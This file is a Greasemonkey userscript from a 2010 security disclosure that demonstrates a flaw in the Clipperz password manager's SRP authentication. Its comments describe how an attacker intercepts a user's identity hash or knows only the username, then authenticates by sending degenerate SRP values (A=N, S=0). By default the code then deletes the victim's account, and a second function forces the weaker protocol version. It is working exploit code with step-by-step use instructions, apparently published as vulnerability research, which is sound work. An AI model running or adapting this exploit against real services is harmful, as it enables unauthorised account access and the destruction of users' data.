// ==UserScript==
// @name           clipperz_srp_flaws
// @namespace      http://seb.dbzteam.org/crypto/
// @description    Flaws in Clipperz SRP implementation
// @include        https://*.clipperz.com/*
// @include        http://*.clipperz.com/*
// ==/UserScript==


// clipperz_srp_flaws.user.js - Greasemonkey script
//
// 09-12-2010 - Sebastien Martini (seb@dbzteam.org)
//
// SRP improper input validation issue in (non-exhaustive list):
//  - clipperz.com/beta
//  - Community Edition <= 003
//  - Javascript Crypto Library <= 002
//
// For more details on this issue see [1] section 3.2.
//
// [1] http://seb.dbzteam.org/crypto/jpake-session-key-retrieval.pdf


// Quick analysis of clipperz's default authentication protocol (version 0.2):
//
// In order to use the following function the attacker first need to intercept
// the 'C' parameter transmitted by the client to the server at the beginning
// of the authentication exchange. This static parameter represents the identity
// of the user:
//               I=sha256(username||passphrase)
//
// One may easily observe that the passphrase is also hashed into identity's
// hash, that means that this authentication protocol from this point on is not
// zero-knowledge anymore. That also imply one active attacker with the
// ability to intercept this field will be able to perform an offline dictionary
// attack on it in order to recover the passphrase and subsequently decrypt all
// user encrypted data.
//
// This task could even be facilited by the fact that http://www.clipperz.com/beta
// also accepts plain http exchanges. https is not mandatory at this address,
// moreover there is no additional check from the client before sending its
// identity to the server.
//
// Once this fixed parameter is captured it is possible to successfully complete
// the authentication to the server by exploiting the SRP implementation issue [1]
// (lack of proper input validation). Afterward an authenticated attacker may
// download all the encrypted data, or execute any administrative action on this
// account on behalf of its victim. For instance he could delete user's account.
//
// Note that at this point an attacker can't decrypt the data, it would need to
// recover the passphrase to do so. The data is AES encrypted with the passphrase
// as encryption key.
//
// There is also another interesting observation: after the completion of the
// authentication, the client transmits the (shared) secret session key in all
// its requests with the server. I didn't take a look at how requests are
// authenticated nor at how sessions are maintained/revoked but there might be
// something to do here too.
//
// Back to the code, this demo assumes an attacker has intercepted the
// identity parameter ('C') and knows the username of its target:
//
// 1- Edit the following code and replace the value of 'c' in function C() with
//    the intercepted hash value corresponding to the identity of the victim.
//    This parameter is transmitted in the 'connect' message at the beginning of
//    the authentication handshake by the client:
//       {"parameters":{"message":"connect","version":"0.2",
//        "parameters":{"C":"___COPY_ME___",...}
// 2- Use victim's username to Authenticate to http://www.clipperz.com/beta/
//    (and of course you don't need to provide a valid passphrase type anything
//    you want).
// 3- The attacker is authenticated and user's account is deleted.
//
function AuthenticateMe02() {
    MochiKit.Base.update(Clipperz.Crypto.SRP.Connection.prototype, {
	'C': function () {
	    var c;
	    // Replace with your 'C' here.
	    c = "_insert_captured_hash_here_";
	    return c;
	},

	'A': function () {
	    if (this._A == null) {
		this._A = Clipperz.Crypto.SRP.n();
	    }
	    return this._A;
	},

	'S': function () {
	    if (this._S == null) {
		this._S = new Clipperz.Crypto.BigInt("0", 10);
	    }
	    return this._S;
	},
    });


    MochiKit.Base.update(Clipperz.PM.Strings.messagePanelConfigurations,{
        'delete_user_account': function() {
            return {'title': 'Delete User Account',
                    'text': 'User account deleted with success!'}
        }
    });

    MochiKit.Base.update(Clipperz.PM.Components.Panels.LoginPanel.prototype, {
	'doLoginWithUsernameAndPassphrase': function(anUsername, aPassphrase) {
	    var deferredResult;
	    var user;

	    user = new Clipperz.PM.DataModel.User({username:anUsername, passphrase:aPassphrase});

	    deferredResult = new MochiKit.Async.Deferred();
            deferredResult.addCallback(MochiKit.Base.method(Clipperz.PM.Components.MessageBox(),
                                                            'deferredShow'),
                                       {title: "",
                                        text: "",
                                        width:240,
                                        showProgressBar:false,
                                        showCloseButton:false,
                                        fn:MochiKit.Base.method(deferredResult, 'cancel'),
                                        scope:this},
                                        this.getDom('login_submit'));

	    deferredResult.addCallback(MochiKit.Base.method(user, 'connect'));

	    deferredResult.addCallback(MochiKit.Base.method(user, 'deleteAccountAction'));
	    deferredResult.addCallback(Clipperz.NotificationCenter.deferredNotification, this,
                                       'updatedProgressState', 'delete_user_account');

	    deferredResult.callback("token");
	    return deferredResult;
	},
    });
}


// Old clipperz authentication protocol (version 0.1):
//
// An account can be created and used exclusively with this version 0.1 of the
// protocol. However notice that as soon as the new protocol is used, the user
// account is upgraded and afterward it seems not possible to successfully
// authenticate with the old protocol anymore.
//
// Note also, this version of the protocol seems to be "more zero-knowledge"
// than the most recent version. Indeed, it appears not transmitting the
// passphrase to the server during the authentication steps. Therefore in this
// case the offline attack against the passphrase should not be possible. But
// it's also easier for an attacker to authenticate to the server by exploiting
// the SRP implementation flaw mentioned earlier. Indeed, in this case there's
// no need to intercept the client's identity, all an attacker has to know is
// the username of its target.
//
// This code only performs authentication to the server. To call this function
// uncomment the code at the bottom of this file.
//
function AuthenticateMe01() {
    MochiKit.Base.update(Clipperz.Crypto.SRP.Connection.prototype, {
	'A': function () {
	    if (this._A == null) {
		this._A = Clipperz.Crypto.SRP.n();
	    }
	    return this._A;
	},

	'S': function () {
	    if (this._S == null) {
		this._S = new Clipperz.Crypto.BigInt("0", 10);
	    }
	    return this._S;
	},
    });

    // Force to use version 0.1
    Clipperz.PM.Crypto.communicationProtocol.currentVersion="0.1";
    MochiKit.Base.update(Clipperz.PM.Crypto.communicationProtocol.versions, {
	"current": Clipperz.PM.Crypto.communicationProtocol.versions["0.1"]
    });
}


// Use this function to register a new user with the old protocol.
function Force01() {
    // Force to use version 0.1
    Clipperz.PM.Crypto.communicationProtocol.currentVersion="0.1";
    MochiKit.Base.update(Clipperz.PM.Crypto.communicationProtocol.versions, {
	"current": Clipperz.PM.Crypto.communicationProtocol.versions["0.1"]
    });
}


var script = document.createElement('script');
// Uncomment to execute AuthenticateMe01()
//script.appendChild(document.createTextNode('('+ AuthenticateMe01 +')();'));
// Execute AuthenticateMe01()
script.appendChild(document.createTextNode('('+ AuthenticateMe02 +')();'));
// Uncomment to execute Force01()
//script.appendChild(document.createTextNode('('+ Force01 +')();'));
(document.body || document.head || document.documentElement).appendChild(script);
